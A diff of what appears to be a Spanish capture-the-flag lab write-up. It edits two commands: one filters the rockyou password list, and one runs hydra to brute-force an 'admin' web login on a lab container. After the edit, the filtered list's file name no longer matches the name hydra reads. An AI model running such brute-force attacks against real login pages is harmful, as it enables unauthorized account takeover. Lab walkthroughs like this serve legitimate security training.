@@ -110,7 +110,7 @@ Accediendo desde el navegador podemos comprobar que se trata de un panel de logi
 
   <pre>
     <code>
-      awk 'length($0)>=10 && $0~/[A-Z]/ && $0~/[a-z]/ && $0~/[0-9]/' /usr/share/wordlists/rockyou.txt > rockyou.txt2
+      tr -d '\r' < rockyou.txt | awk 'length($0)>=10 && /[A-Z]/ && /[a-z]/ && /[0-9]/' | sponge new_rockyou.txt
     </code>
   </pre>
 
@@ -118,8 +118,8 @@ Accediendo desde el navegador podemos comprobar que se trata de un panel de logi
 
   <pre>
     <code>
-       ┌──(root㉿kali)-[/home/kali/Dockerlabs]
-       └─# hydra -l admin -P rockyou.txt2 172.17.0.3 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials."
+┌──(root㉿kali)-[/home/kali/Dockerlabs]
+└─# hydra -l admin -P rockyou.txt2 172.17.0.3 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials."
     </code>
   </pre>
 
